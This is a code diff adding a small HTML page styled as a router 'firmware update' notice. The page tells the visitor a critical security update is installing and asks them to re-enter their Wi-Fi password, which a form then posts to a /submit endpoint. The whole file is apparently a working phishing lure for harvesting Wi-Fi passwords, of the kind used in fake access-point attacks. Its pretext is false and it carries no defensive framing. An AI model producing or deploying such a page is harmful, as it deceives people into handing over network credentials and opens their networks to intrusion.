@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
+        .box { background: white; padding: 30px; display: inline-block; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 300px; }
+        input[type=password] { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Router Firmware Update</h2>
+        <p>A critical router security update is installing. Please re-enter your Wi-Fi password to restore connectivity.</p>
+        <form action="/submit" method="POST">
+            <input type="password" name="password" placeholder="Wi-Fi Password" required><br>
+            <button type="submit">Update Now</button>
+        </form>
+    </div>
+</body>
+</html>
